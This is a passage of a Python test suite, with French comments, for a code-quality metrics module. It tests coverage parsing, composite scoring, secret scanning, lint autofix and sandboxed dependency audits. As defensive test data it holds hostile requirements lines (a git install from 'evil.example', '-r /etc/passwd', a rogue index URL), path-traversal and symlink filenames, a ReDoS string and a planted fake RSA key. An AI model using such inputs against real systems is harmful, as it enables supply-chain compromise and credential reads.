"""Tests G1 (#383, #541) : mesure des métriques de qualité projet.

Sécu = scan statique déterministe (injectable) ; couverture = sandbox mocké ;
revue LLM = informative (hors composite).
"""

import math
import time

import pytest

from collegue.executor import FakeReviewer
from collegue.improve import (
    CompositeWeights,
    ProjectQualityMetrics,
    composite_score,
    measure,
    parse_coverage,
    persist,
)
from collegue.improve.metrics import DEFAULT_COVERAGE_COMMAND
from collegue.sandbox import SandboxResult, SandboxUnavailable
from collegue.state import ProjectStateManager

COV_OUTPUT = """Name        Stmts   Miss  Cover   Missing
-----------------------------------------------
foo.py         10      1    90%   7
-----------------------------------------------
TOTAL          10      1    90%
"""


class _Sandbox:
    def __init__(self, *, stdout=COV_OUTPUT, ok=True):
        self._stdout = stdout
        self._ok = ok

    def run_tests(self, workspace, command="pytest -q"):
        return SandboxResult(exit_code=0 if self._ok else 1, stdout=self._stdout, stderr="")


def _scan(total, weighted):
    """Stub de scan sécu déterministe (compte brut, score pondéré)."""

    def fn(workspace):
        return total, weighted

    return fn


def _quality(lint=0, complexity=0, measured=True):
    """Stub de scan qualité déterministe (lint, complexité, measured)."""

    def fn(workspace):
        return lint, complexity, measured

    return fn


# --- parse_coverage -------------------------------------------------------------


def test_parse_coverage_total_line():
    assert parse_coverage(COV_OUTPUT) == 90.0


def test_parse_coverage_decimal():
    assert parse_coverage("TOTAL   200   10   80.5%") == 80.5


def test_parse_coverage_zero_and_full():
    assert parse_coverage("TOTAL  5  5  0%") == 0.0
    assert parse_coverage("TOTAL  5  0  100%") == 100.0


def test_parse_coverage_absent_or_empty():
    assert parse_coverage("pas de ligne total ici") is None
    assert parse_coverage("") is None


def test_parse_coverage_ignores_file_named_total():
    # Un fichier « TOTAL.py » ne doit pas être pris pour la ligne récapitulative.
    out = "TOTAL.py   10   5   50%\n----\nTOTAL      10   1   90%\n"
    assert parse_coverage(out) == 90.0
    assert parse_coverage("TOTAL.py   10   5   50%\n") is None


# --- parse_coverage : formats multi-écosystèmes (#577) --------------------------


def test_parse_coverage_go_test_cover():
    out = "ok  \tmodule/a\t0.012s\tcoverage: 50.0% of statements\n"
    assert parse_coverage(out) == 50.0


def test_parse_coverage_go_func_total():
    out = "module/a/x.go:10:\tDo\t100.0%\ntotal:\t(statements)\t87.5%\n"
    assert parse_coverage(out) == 87.5


def test_parse_coverage_istanbul_text_summary():
    out = (
        "=============================== Coverage summary ===============================\n"
        "Statements   : 91.22% ( 166/182 )\n"
        "Branches     : 75% ( 18/24 )\n"
        "Lines        : 90% ( 161/179 )\n"
    )
    assert parse_coverage(out) == 91.22


def test_parse_coverage_istanbul_or_vitest_table():
    out = (
        "File           | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s\n"
        "---------------|---------|----------|---------|---------|------------------\n"
        "All files      |   85.71 |    66.66 |     100 |   85.71 |\n"
    )
    assert parse_coverage(out) == 85.71


def test_parse_coverage_lcov_summary():
    out = "Summary coverage rate:\n  lines......: 92.3% (1200 of 1300 lines)\n  functions..: 88.0% (44 of 50)\n"
    assert parse_coverage(out) == 92.3


def test_parse_coverage_cobertura_xml_ratio_converted():
    out = '<?xml version="1.0" ?>\n<coverage line-rate="0.98" branch-rate="0.75" version="6.5">\n'
    assert parse_coverage(out) == pytest.approx(98.0)


def test_parse_coverage_cobertura_zero_and_full():
    assert parse_coverage('<coverage line-rate="0" branch-rate="0">') == pytest.approx(0.0)
    assert parse_coverage('<coverage line-rate="1.0">') == pytest.approx(100.0)


def test_parse_coverage_ignores_parasitic_percent():
    # Un % parasite SANS format de couverture reconnu ne doit JAMAIS matcher (#577).
    assert parse_coverage("discount: 50% off today\n100%|####| 10/10 done\n") is None
    assert parse_coverage("coverage rose to 80% this week") is None  # pas « of statements »


def test_default_coverage_command_uses_python_m_pytest():
    # #577 : src-layout — `python -m pytest` met le cwd sur sys.path (vs `pytest` nu),
    # sinon les imports `from app...` cassent à la collecte → garde dure G2 rejette tout.
    assert DEFAULT_COVERAGE_COMMAND.startswith("python -m pytest")
    assert "--cov" in DEFAULT_COVERAGE_COMMAND


def test_parse_coverage_clamps_to_0_100():
    # #577 (revue) : un faux-match ne doit JAMAIS injecter une valeur hors [0,100] qui
    # dominerait le composite (poids couverture = 1.0) et corromprait le delta du gate.
    assert parse_coverage("All files |   4200 | MB used") == 100.0
    assert parse_coverage('<coverage line-rate="1.5">') == 100.0


def test_parse_coverage_redos_resistant():
    # #577 (revue) : parse_coverage tourne CÔTÉ HÔTE sur une stdout NON fiable (projet LLM).
    # Une ligne TOTAL/total: suivie d'un long run de chiffres SANS « % » ne doit pas faire
    # exploser le temps (backtracking catastrophique) — patterns possessifs/colonnes.
    hostile_total = "TOTAL " + "1" * 50000
    hostile_go = "total: " + "1" * 50000
    start = time.perf_counter()
    assert parse_coverage(hostile_total) is None
    assert parse_coverage(hostile_go) is None
    assert time.perf_counter() - start < 1.0  # corrigé : ~ms ; vulnérable : plusieurs minutes


def test_parse_coverage_go_parasitic_not_captured():
    # #577 (revue) : le motif go ne doit PAS capter un « coverage: NN% of statements » au
    # milieu d'une phrase / log / commentaire (ancrage sur la ligne de statut ok/FAIL).
    assert parse_coverage("Note: coverage: 5% of statements is too low, see docs") is None
    assert parse_coverage("// historical coverage: 99% of statements (2019)") is None


def test_parse_coverage_go_multipackage_takes_first_documented():
    # Limite connue documentée : « go test -cover ./... » émet une ligne PAR paquet (pas
    # d'agrégat) → on lit le 1er (déterministe). Pour un total fiable : « go tool cover -func ».
    out = "ok  pkg/a  0.01s  coverage: 40.0% of statements\nok  pkg/b  0.02s  coverage: 90.0% of statements\n"
    assert parse_coverage(out) == 40.0


def test_parse_coverage_lcov_dots_optional_and_case():
    # #577 (revue) : tolérer 'lines:' (sans points) et 'Lines:' (capitale).
    assert parse_coverage("  lines: 92.3% (1200 of 1300 lines)") == 92.3
    assert parse_coverage("Lines: 88.0%") == 88.0


def test_parse_coverage_cobertura_leading_dot():
    # #577 (revue) : line-rate=".97" (sans zéro de tête) → 97.0.
    assert parse_coverage('<coverage line-rate=".97" branch-rate="0.5">') == pytest.approx(97.0)


# --- composite_score ------------------------------------------------------------


def test_composite_monotonic():
    base = composite_score(50.0, 1.0, lint_violations=2, complexity_bad_blocks=1)
    assert composite_score(60.0, 1.0, lint_violations=2, complexity_bad_blocks=1) > base  # ↑ couverture → ↑
    assert composite_score(50.0, 0.0, lint_violations=2, complexity_bad_blocks=1) > base  # ↓ sécu → ↑
    assert composite_score(50.0, 1.0, lint_violations=0, complexity_bad_blocks=1) > base  # ↓ lint → ↑
    assert composite_score(50.0, 1.0, lint_violations=2, complexity_bad_blocks=0) > base  # ↓ complexité → ↑
    assert composite_score(50.0, 3.0, lint_violations=2, complexity_bad_blocks=1) < base  # ↑ sécu → ↓
    assert composite_score(50.0, 1.0, lint_violations=9, complexity_bad_blocks=1) < base  # ↑ lint → ↓


def test_composite_excludes_review():
    # La revue n'est PAS un paramètre du composite (informative, hors-gate).
    assert composite_score(80.0, 0.0) == pytest.approx(0.8)


def test_composite_weights_tunable():
    w = CompositeWeights(coverage=2.0, security=0.0, lint=0.0, complexity=0.0)
    # sécu/lint/complexité ignorés ; couverture 100 % → 2.0
    assert composite_score(100.0, 5.0, lint_violations=9, complexity_bad_blocks=9, weights=w) == pytest.approx(2.0)


def test_composite_dep_vulns_penalty():
    # dep_vulns pénalise le composite ; 0 (défaut, flag off) = aucun effet.
    base = composite_score(80.0, 0.0)
    assert composite_score(80.0, 0.0, dep_vulns=0) == base  # off → inchangé
    assert composite_score(80.0, 0.0, dep_vulns=2) < base  # 2 vulns → ↓


# --- measure --------------------------------------------------------------------


async def test_measure_aggregates_all_dimensions():
    reviewer = FakeReviewer(quality_score=0.8, findings=[])  # informatif
    m = await measure(
        "/ws",
        ctx=None,
        sandbox=_Sandbox(),
        reviewer=reviewer,
        diff="d",
        security_scan_fn=_scan(2, 5.0),
        quality_scan_fn=_quality(3, 1),
    )
    assert isinstance(m, ProjectQualityMetrics)
    assert m.coverage_pct == 90.0
    assert m.review_score == 0.8  # informatif (reviewer + diff fournis)
    assert m.security_findings == 2
    assert m.security_weighted == 5.0
    assert m.lint_violations == 3
    assert m.complexity_bad_blocks == 1
    assert m.tests_passed is True
    assert m.coverage_measured is True
    # composite = w_cov*0.9 − w_sec*5.0 − w_lint*3 − w_cx*1 (la revue n'y entre PAS)
    assert m.composite == pytest.approx(1.0 * 0.9 - 0.1 * 5.0 - 0.02 * 3 - 0.05 * 1)


async def test_measure_review_excluded_from_composite():
    # Deux revues opposées, même couverture/sécu/qualité → même composite (revue hors-gate).
    sb, scan, qual = _Sandbox(), _scan(0, 0.0), _quality(0, 0)
    m_hi = await measure(
        "/ws",
        ctx=None,
        sandbox=sb,
        reviewer=FakeReviewer(quality_score=0.9),
        diff="d",
        security_scan_fn=scan,
        quality_scan_fn=qual,
    )
    m_lo = await measure(
        "/ws",
        ctx=None,
        sandbox=sb,
        reviewer=FakeReviewer(quality_score=0.1),
        diff="d",
        security_scan_fn=scan,
        quality_scan_fn=qual,
    )
    assert m_hi.review_score == 0.9 and m_lo.review_score == 0.1
    assert m_hi.composite == m_lo.composite


async def test_measure_without_reviewer_is_deterministic():
    # Pas de reviewer → review_score neutre (0.0), composite purement déterministe.
    m = await measure(
        "/ws", ctx=None, sandbox=_Sandbox(), security_scan_fn=_scan(0, 0.0), quality_scan_fn=_quality(0, 0)
    )
    assert m.review_score == 0.0
    assert m.composite == pytest.approx(0.9)


async def test_measure_exposes_the_review_verdict_as_a_veto_not_as_a_score():
    """Vague 3 : hors composite, mais le verdict BLOQUANT (ou la panne) du reviewer est tracé pour le gate."""
    from collegue.executor.quality_gate import ReviewFindingLite

    common = dict(
        ctx=None, sandbox=_Sandbox(), diff="d", security_scan_fn=_scan(0, 0.0), quality_scan_fn=_quality(0, 0)
    )
    clean = await measure("/ws", reviewer=FakeReviewer(), **common)
    assert (clean.review_measured, clean.review_blocking, clean.review_error) == (True, False, "")

    blocking = await measure(
        "/ws",
        reviewer=FakeReviewer(blocking=True, findings=[ReviewFindingLite("security", "critical", "RCE")]),
        **common,
    )
    assert (blocking.review_measured, blocking.review_blocking) == (True, True)
    assert blocking.composite == clean.composite  # le veto n'altère pas le score : il le rend sans effet

    class _Broken:
        async def review(self, diff, ctx, *, issue=None):
            raise RuntimeError("reviewer indisponible")

    failed = await measure("/ws", reviewer=_Broken(), **common)
    assert failed.review_measured is False and "indisponible" in failed.review_error

    absent = await measure("/ws", **common)
    assert (absent.review_measured, absent.review_blocking, absent.review_error) == (False, False, "")


async def test_measure_does_not_swallow_cancellation_or_budget_stops_from_the_reviewer():
    class _Cancelled:
        async def review(self, diff, ctx, *, issue=None):
            raise KeyboardInterrupt

    with pytest.raises(KeyboardInterrupt):
        await measure(
            "/ws",
            ctx=None,
            sandbox=_Sandbox(),
            reviewer=_Cancelled(),
            diff="d",
            security_scan_fn=_scan(0, 0.0),
            quality_scan_fn=_quality(0, 0),
        )


def test_secret_scan_scope_is_named_precisely():
    from collegue.improve.metrics import SECRET_SCAN_SCOPE

    assert "scan statique de secrets" in SECRET_SCAN_SCOPE and "regex" in SECRET_SCAN_SCOPE


async def test_measure_doc_coverage_informative(tmp_path):
    # doc_coverage est calculée (informative) mais N'ENTRE PAS dans le composite.
    base = await measure(
        "/ws", ctx=None, sandbox=_Sandbox(), security_scan_fn=_scan(0, 0.0), quality_scan_fn=_quality(0, 0)
    )
    m = await measure(
        "/ws",
        ctx=None,
        sandbox=_Sandbox(),
        security_scan_fn=_scan(0, 0.0),
        quality_scan_fn=_quality(0, 0),
        doc_coverage_fn=lambda ws: 0.42,
    )
    assert m.doc_coverage == 0.42
    assert m.composite == base.composite  # doc_coverage hors-composite


async def test_measure_dep_vulns_opt_in():
    # OFF par défaut → dep_vulns=0, composite inchangé. ON (fn injectée) → compté + gaté.
    off = await measure(
        "/ws", ctx=None, sandbox=_Sandbox(), security_scan_fn=_scan(0, 0.0), quality_scan_fn=_quality(0, 0)
    )
    assert off.dep_vulns == 0
    on = await measure(
        "/ws",
        ctx=None,
        sandbox=_Sandbox(),
        security_scan_fn=_scan(0, 0.0),
        quality_scan_fn=_quality(0, 0),
        dep_vulns_enabled=True,
        dep_vulns_fn=lambda ws: 3,
    )
    assert on.dep_vulns == 3
    assert on.composite < off.composite  # 3 vulns pénalisent le composite


def test_default_doc_coverage_ast(tmp_path):
    # ast réel : 1 module + 1 fonction publique sur 2 documentés → 0.5 ; tests exclus.
    (tmp_path / "mod.py").write_text('"""Module documenté."""\n\n\ndef public():\n    return 1\n')
    (tmp_path / "test_mod.py").write_text("def helper():\n    return 1\n")  # exclu
    from collegue.improve.metrics import _default_doc_coverage

    cov = _default_doc_coverage(str(tmp_path))
    # symboles comptés : module (doc=oui) + public() (doc=non) → 1/2 = 0.5
    assert cov == pytest.approx(0.5)


def test_default_dep_audit_without_requirements_is_zero_and_never_calls_the_sandbox(tmp_path):
    # Rien de déclaré à auditer (pas de requirements.txt) → 0, sans rien lancer.
    from collegue.improve.metrics import _default_dep_audit

    class _Boom:
        def run_tests(self, *a, **k):
            raise AssertionError("aucun audit sans requirements.txt")

    assert _default_dep_audit(str(tmp_path), sandbox=_Boom()) == 0
    assert _default_dep_audit(str(tmp_path)) == 0


async def test_measure_tests_red_and_no_coverage():
    m = await measure(
        "/ws",
        ctx=None,
        sandbox=_Sandbox(stdout="boom", ok=False),
        security_scan_fn=_scan(0, 0.0),
        quality_scan_fn=_quality(0, 0),
    )
    assert m.tests_passed is False
    assert m.coverage_pct == 0.0  # pas de ligne TOTAL → 0
    assert m.coverage_measured is False  # « non mesuré » distingué d'un vrai 0 %
    assert m.security_findings == 0


async def test_measure_genuine_zero_coverage_is_measured():
    # 0 % RÉEL (ligne TOTAL présente) doit être marqué mesuré (distinct de None).
    m = await measure(
        "/ws",
        ctx=None,
        sandbox=_Sandbox(stdout="TOTAL  5  5  0%\n"),
        security_scan_fn=_scan(0, 0.0),
        quality_scan_fn=_quality(0, 0),
    )
    assert m.coverage_pct == 0.0
    assert m.coverage_measured is True


async def test_measure_security_scan_failure_is_fail_closed():
    # Toute panne du scan sécu ⇒ (-1, inf) ⇒ composite non fini ⇒ le gate rejettera.
    def boom(workspace):
        raise RuntimeError("scan KO")

    m = await measure("/ws", ctx=None, sandbox=_Sandbox(), security_scan_fn=boom, quality_scan_fn=_quality(0, 0))
    assert m.security_findings == -1
    assert math.isinf(m.security_weighted)
    assert not math.isfinite(m.composite)


async def test_measure_quality_scan_failure_is_not_measured():
    # Panne du scan QUALITÉ ⇒ (0, 0, measured=False) : composite fini (neutre) MAIS
    # marqué non mesuré → le gate rejettera une bascule avant≠après (≠ sécu fail-closed).
    def boom(workspace):
        raise RuntimeError("ruff KO")

    m = await measure("/ws", ctx=None, sandbox=_Sandbox(), security_scan_fn=_scan(0, 0.0), quality_scan_fn=boom)
    assert m.lint_violations == 0
    assert m.complexity_bad_blocks == 0
    assert m.quality_measured is False
    assert m.composite == pytest.approx(0.9)  # fini, non bloquant seul


async def test_measure_quality_measured_flag_true_when_scanned():
    m = await measure(
        "/ws", ctx=None, sandbox=_Sandbox(), security_scan_fn=_scan(0, 0.0), quality_scan_fn=_quality(0, 0, True)
    )
    assert m.quality_measured is True


def test_default_security_scan_detects_planted_secret(tmp_path):
    # Valide le CÂBLAGE réel de secret_scan (pas un stub) : répertoire propre → 0 ;
    # secret planté (clé privée RSA, critique) → détecté et pondéré (> 0).
    from collegue.improve.metrics import _default_security_scan

    (tmp_path / "clean.py").write_text("x = 1\n")
    total0, weighted0 = _default_security_scan(str(tmp_path))
    assert total0 == 0 and weighted0 == 0.0

    (tmp_path / "leak.py").write_text(
        'KEY = """-----BEGIN RSA PRIVATE KEY-----\nMIIBmQ\n-----END RSA PRIVATE KEY-----"""\n'
    )
    total1, weighted1 = _default_security_scan(str(tmp_path))
    assert total1 >= 1 and weighted1 > 0.0


def test_autofix_lint_cleans_fixable_violations(tmp_path):
    # ruff --fix + format nettoie le lint auto-corrigible des fichiers Python touchés.
    from collegue.improve.metrics import _find_ruff, autofix_lint

    if _find_ruff() is None:
        pytest.skip("ruff indisponible dans cet environnement")

    f = tmp_path / "dirty.py"
    f.write_text("import os\nimport sys\nx=1\n")  # os/sys inutilisés (F401) + espacement (E225)
    n = autofix_lint(str(tmp_path), ["dirty.py"])
    assert n == 1
    cleaned = f.read_text()
    assert "import os" not in cleaned and "import sys" not in cleaned  # F401 retirés (--fix)
    assert "x = 1" in cleaned  # espacement corrigé (format)


def test_autofix_lint_noop_without_python(tmp_path):
    from collegue.improve.metrics import autofix_lint

    (tmp_path / "data.txt").write_text("import os\n")
    assert autofix_lint(str(tmp_path), ["data.txt"]) == 0  # aucun .py → no-op
    assert autofix_lint(str(tmp_path), ["missing.py"]) == 0  # fichier absent → no-op


def test_default_security_scan_excludes_generated_and_tests(tmp_path):
    # Le scan sécu de la boucle (#547) ignore lockfiles + emplacements de test : un
    # secret qui y est planté n'est PAS compté ; le même dans du code produit l'est.
    from collegue.improve.metrics import _default_security_scan

    rsa = '"-----BEGIN RSA PRIVATE KEY-----"'
    (tmp_path / "package-lock.json").write_text("{" + f'"k": {rsa}' + "}\n")
    (tmp_path / "test_thing.py").write_text(f"KEY = {rsa}\n")
    (tmp_path / "fixtures").mkdir()
    (tmp_path / "fixtures" / "data.py").write_text(f"KEY = {rsa}\n")
    total0, weighted0 = _default_security_scan(str(tmp_path))
    assert total0 == 0 and weighted0 == 0.0  # tout est dans des emplacements exclus

    (tmp_path / "app.py").write_text(f"KEY = {rsa}\n")  # code produit → compté
    total1, weighted1 = _default_security_scan(str(tmp_path))
    assert total1 >= 1 and weighted1 > 0.0


def test_default_quality_scan_counts_lint_and_complexity(tmp_path):
    # Valide le CÂBLAGE réel de ruff (pas un stub) : fichier propre → (0, 0) ;
    # imports inutilisés + fonction très imbriquée → lint > 0 ET complexité > 0.
    from collegue.improve.metrics import _default_quality_scan, _find_ruff

    if _find_ruff() is None:
        pytest.skip("ruff indisponible dans cet environnement")

    (tmp_path / "clean.py").write_text("def f():\n    return 1\n")
    lint0, cx0, measured0 = _default_quality_scan(str(tmp_path), complexity_max=5)
    assert lint0 == 0 and cx0 == 0 and measured0 is True

    nested = "                                        return a\n"
    (tmp_path / "bad.py").write_text(
        "import os, sys\n"
        "def g(a):\n"
        "    if a > 0:\n        if a > 1:\n            if a > 2:\n                if a > 3:\n"
        "                    if a > 4:\n                        if a > 5:\n" + nested + "    return 0\n"
    )
    lint1, cx1, measured1 = _default_quality_scan(str(tmp_path), complexity_max=5)
    assert measured1 is True
    assert lint1 >= 1  # E401 (imports multiples) / F401 (inutilisés)
    assert cx1 >= 1  # C901 (complexité > seuil)


# --- persist --------------------------------------------------------------------


def test_persist_writes_metrics(tmp_path):
    manager = ProjectStateManager.from_url(f"sqlite:///{tmp_path / 'state.db'}", create=True)
    pid = manager.create_project(name="demo")
    m = ProjectQualityMetrics(
        coverage_pct=90.0,
        security_findings=1,
        security_weighted=5.0,
        tests_passed=True,
        composite=0.4,
        review_score=0.8,
        lint_violations=3,
        complexity_bad_blocks=2,
        quality_measured=True,
        doc_coverage=0.75,
        dep_vulns=1,
    )
    persist(manager, pid, m)
    names = {metric.name for metric in manager.get_metrics(pid)}
    assert names == {
        "coverage_pct",
        "security_findings",
        "security_weighted",
        "tests_passed",
        "coverage_measured",
        "review_score",
        "lint_violations",
        "complexity_bad_blocks",
        "quality_measured",
        "doc_coverage",
        "dep_vulns",
        "composite",
    }
    assert manager.get_metrics(pid, "composite")[0].value == pytest.approx(0.4)
    assert manager.get_metrics(pid, "security_weighted")[0].value == pytest.approx(5.0)
    assert manager.get_metrics(pid, "tests_passed")[0].value == 1.0


# --- frontière hôte : noms de fichiers d'un agent (autofix / docstrings) ------------------------


def _install_fake_ruff(tmp_path, monkeypatch):
    """Faux ruff déterministe : ajoute une ligne à CHAQUE ``*.py`` reçu (comme ruff --fix réécrit
    le fichier désigné, y compris à travers un lien symbolique). Aucune dépendance à un vrai ruff."""
    import collegue.improve.metrics as metrics_mod

    script = tmp_path / "fake-ruff"
    script.write_text(
        '#!/bin/sh\nfor a in "$@"; do case "$a" in *.py) printf "# ruff-touched\\n" >> "$a";; esac; done\n'
    )
    script.chmod(0o755)
    monkeypatch.setattr(metrics_mod, "_find_ruff", lambda: str(script))
    return script


def test_autofix_lint_never_rewrites_outside_the_workspace_or_through_links(tmp_path, monkeypatch):
    import os

    from collegue.improve.metrics import autofix_lint

    _install_fake_ruff(tmp_path, monkeypatch)
    outside = tmp_path / "outside"
    outside.mkdir()
    target = outside / "target.py"
    target.write_text("import os\nx=1\n")
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "ok.py").write_text("y=2\n")
    os.symlink(target, ws / "link.py")  # lien vers un fichier HORS workspace
    os.symlink(outside, ws / "linkdir")  # répertoire intermédiaire lié vers l'extérieur
    os.symlink(ws / "ok.py", ws / "alias.py")  # lien INTERNE : on n'écrit jamais à travers un lien
    (ws / "sub").mkdir()

    names = [
        "ok.py",
        "link.py",
        "linkdir/target.py",
        "alias.py",
        "../outside/target.py",
        str(target),  # chemin absolu hors workspace
        "sub/../../outside/target.py",
        "",
        "nul\x00.py",
    ]
    assert autofix_lint(str(ws), names) == 1  # seul ok.py est traité

    assert target.read_text() == "import os\nx=1\n"  # rien n'a été réécrit hors workspace
    assert (ws / "ok.py").read_text().count("# ruff-touched") == 2  # 1 fichier x (check --fix + format)


def test_autofix_lint_accepts_a_nested_regular_file_given_relative_or_absolute(tmp_path, monkeypatch):
    from collegue.improve.metrics import autofix_lint

    _install_fake_ruff(tmp_path, monkeypatch)
    ws = tmp_path / "ws"
    (ws / "pkg").mkdir(parents=True)
    (ws / "pkg" / "mod.py").write_text("x=1\n")
    assert autofix_lint(str(ws), ["pkg/mod.py"]) == 1
    assert autofix_lint(str(ws), [str(ws / "pkg" / "mod.py")]) == 1  # absolu mais SOUS le workspace
    assert (ws / "pkg" / "mod.py").read_text().count("# ruff-touched") == 4


def test_default_doc_coverage_never_reads_files_behind_links(tmp_path):
    import os

    from collegue.improve.metrics import _default_doc_coverage

    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "documented.py").write_text('"""Doc."""\n\n\ndef a():\n    """d"""\n\n\ndef b():\n    """d"""\n')
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "bare.py").write_text("def undocumented():\n    pass\n")
    os.symlink(outside / "documented.py", ws / "linked.py")
    os.symlink(outside, ws / "linkdir")

    # sans suivre les liens : module sans docstring + fonction sans docstring → 0/2
    assert _default_doc_coverage(str(ws)) == 0.0


# --- audit de dépendances : jamais sur l'hôte, fail-closed --------------------------------------

_AUDIT_OK_2_VULNS = (
    '{"dependencies": [{"name": "flask", "version": "0.5", "vulns": [{"id": "PYSEC-1"}, {"id": "PYSEC-2"}]},'
    ' {"name": "click", "version": "8.1.7", "vulns": []}], "fixes": []}'
)
_AUDIT_OK_CLEAN = '{"dependencies": [{"name": "click", "version": "8.1.7", "vulns": []}], "fixes": []}'


class _AuditSandbox:
    """Sandbox factice : couverture pour les tests, réponse configurable pour pip-audit."""

    def __init__(self, *, exit_code=0, stdout="", stderr="", timed_out=False, raises=None):
        self.audit = SandboxResult(exit_code=exit_code, stdout=stdout, stderr=stderr, timed_out=timed_out)
        self.raises = raises
        self.calls = []

    def run_tests(self, workspace, command="pytest -q"):
        self.calls.append((workspace, command))
        if "pip-audit" in command:
            if self.raises is not None:
                raise self.raises
            return self.audit
        return SandboxResult(exit_code=0, stdout=COV_OUTPUT, stderr="")

    @property
    def audit_calls(self):
        return [c for c in self.calls if "pip-audit" in c[1]]


async def _measure_with_audit(workspace, sandbox, **kwargs):
    return await measure(
        str(workspace),
        ctx=None,
        sandbox=sandbox,
        security_scan_fn=_scan(0, 0.0),
        quality_scan_fn=_quality(0, 0),
        doc_coverage_fn=lambda ws: 1.0,
        dep_vulns_enabled=True,
        **kwargs,
    )


def _ws_with_requirements(tmp_path, text="click==8.1.7\n"):
    ws = tmp_path / "ws"
    ws.mkdir(exist_ok=True)
    (ws / "requirements.txt").write_text(text)
    return ws


async def test_dep_audit_valid_result_counts_vulns_inside_the_sandbox(tmp_path):
    ws = _ws_with_requirements(tmp_path)
    clean = await _measure_with_audit(ws, _AuditSandbox(stdout=_AUDIT_OK_CLEAN))
    sandbox = _AuditSandbox(exit_code=1, stdout=_AUDIT_OK_2_VULNS)  # pip-audit sort 1 quand il trouve des vulns
    dirty = await _measure_with_audit(ws, sandbox)

    assert clean.dep_audit_measured and clean.dep_vulns == 0
    assert dirty.dep_audit_measured and dirty.dep_vulns == 2
    assert dirty.composite < clean.composite  # les vulns pénalisent le composite
    (workspace, command) = sandbox.audit_calls[0]
    assert workspace == str(ws)
    assert "--no-deps" in command and "--disable-pip" in command  # aucune résolution pip


@pytest.mark.parametrize(
    "kwargs",
    [
        dict(exit_code=127, stderr="sh: 1: pip-audit: not found"),  # outil absent de l'image sandbox
        dict(exit_code=124, timed_out=True, stderr="[sandbox] délai dépassé après 120s"),  # timeout
        dict(exit_code=1, stderr="ERROR: requirement 'evil' is not pinned to an exact version"),  # échec
        dict(exit_code=0, stdout="pas du json"),
        dict(exit_code=0, stdout="{}"),  # forme inattendue
        dict(exit_code=0, stdout='{"dependencies": "x"}'),
        dict(exit_code=2, stdout=_AUDIT_OK_CLEAN),  # mauvais code de sortie malgré un JSON propre
        dict(exit_code=0, stdout=_AUDIT_OK_CLEAN[:40] + "\n[sandbox] sortie tronquée à 10 octets"),  # tronqué
        dict(  # dépendance non auditée : jamais un faux 0
            exit_code=0,
            stdout='{"dependencies": [{"name": "privé", "version": "1.0", "skip_reason": "not on PyPI"}], "fixes": []}',
        ),
        dict(raises=SandboxUnavailable("docker indisponible")),
    ],
    ids=[
        "outil-absent",
        "timeout",
        "echec",
        "non-json",
        "forme-vide",
        "forme-invalide",
        "mauvais-code",
        "tronque",
        "dependance-non-auditee",
        "sandbox-indisponible",
    ],
)
async def test_dep_audit_failure_is_refused_never_zero_vulnerabilities(tmp_path, kwargs):
    import math

    ws = _ws_with_requirements(tmp_path)
    ok = await _measure_with_audit(ws, _AuditSandbox(stdout=_AUDIT_OK_CLEAN))

    m = await _measure_with_audit(ws, _AuditSandbox(**kwargs))

    assert m.dep_audit_measured is False
    assert m.dep_vulns == -1
    assert not math.isfinite(m.composite) and m.composite < ok.composite  # jamais meilleur que 0 vuln
    # et le gate rejette, avant comme après (le composite non fini ne peut compenser rien)
    from collegue.improve.gate import evaluate

    assert evaluate(ok, m).accepted is False
    assert evaluate(m, ok).accepted is False


def test_default_dep_audit_without_any_isolation_is_refused(tmp_path):
    from collegue.improve.metrics import DepAuditUnavailable, _default_dep_audit

    ws = _ws_with_requirements(tmp_path)
    with pytest.raises(DepAuditUnavailable):
        _default_dep_audit(str(ws))  # pas de sandbox : on ne se rabat JAMAIS sur l'hôte
    with pytest.raises(DepAuditUnavailable):
        _default_dep_audit(str(ws), sandbox=object())


@pytest.mark.parametrize(
    "requirements",
    [
        "-e git+https://evil.example/pkg.git#egg=pkg\n",
        "evil @ file:///workspace/evil-pkg\n",
        "./evil-pkg\n",
        "evil @ git+ssh://git@evil.example/evil.git@main\n",
        "-r /etc/passwd\n--index-url https://evil.example/simple\nrequests==2.0\n",
    ],
    ids=["vcs-editable", "file-url", "chemin-local", "vcs-ssh", "include-et-index"],
)
async def test_dep_audit_hostile_requirements_never_reach_a_host_resolver(tmp_path, monkeypatch, requirements):
    """Exigence VCS/locale hostile : ni pip, ni pip-audit, ni aucun sous-process ne tourne sur l'hôte."""
    import os
    import shutil
    import subprocess

    witness = tmp_path / "host-witness"
    fake_tool = tmp_path / "bin" / "pip-audit"
    fake_tool.parent.mkdir()
    fake_tool.write_text(f"#!/bin/sh\nprintf executed >> '{witness}'\nexit 1\n")
    fake_tool.chmod(0o755)
    monkeypatch.setenv("PATH", f"{fake_tool.parent}{os.pathsep}{os.environ['PATH']}")
    real_which = shutil.which
    monkeypatch.setattr(
        shutil, "which", lambda name, *a, **k: str(fake_tool) if name == "pip-audit" else real_which(name, *a, **k)
    )

    def _no_host_process(*a, **k):
        raise AssertionError(f"sous-process hôte interdit pendant l'audit: {a[:1]}")

    monkeypatch.setattr(subprocess, "run", _no_host_process)
    monkeypatch.setattr(subprocess, "Popen", _no_host_process)
    monkeypatch.setattr(os, "system", _no_host_process)

    ws = _ws_with_requirements(tmp_path, requirements)
    # le sandbox (isolé) échoue comme le ferait pip-audit --no-deps --disable-pip sur une exigence non épinglée
    sandbox = _AuditSandbox(exit_code=1, stderr="ERROR: unsupported requirement")

    m = await _measure_with_audit(ws, sandbox)

    assert not witness.exists()
    assert len(sandbox.audit_calls) == 1
    assert m.dep_audit_measured is False and m.composite == float("-inf")


async def test_dep_audit_injected_fn_is_preserved_and_fails_closed(tmp_path):
    ws = _ws_with_requirements(tmp_path)
    sandbox = _AuditSandbox()

    ok = await _measure_with_audit(ws, sandbox, dep_vulns_fn=lambda w: 3)
    boom = await _measure_with_audit(ws, sandbox, dep_vulns_fn=lambda w: (_ for _ in ()).throw(RuntimeError("panne")))
    negative = await _measure_with_audit(ws, sandbox, dep_vulns_fn=lambda w: -5)

    assert ok.dep_audit_measured and ok.dep_vulns == 3
    assert boom.dep_audit_measured is False and negative.dep_audit_measured is False
    assert sandbox.audit_calls == []  # une fn injectée remplace l'audit par défaut (aucun appel sandbox)


async def test_dep_audit_disabled_or_without_requirements_costs_nothing(tmp_path):
    sandbox = _AuditSandbox()
    off = await measure(
        str(tmp_path),
        ctx=None,
        sandbox=sandbox,
        security_scan_fn=_scan(0, 0.0),
        quality_scan_fn=_quality(0, 0),
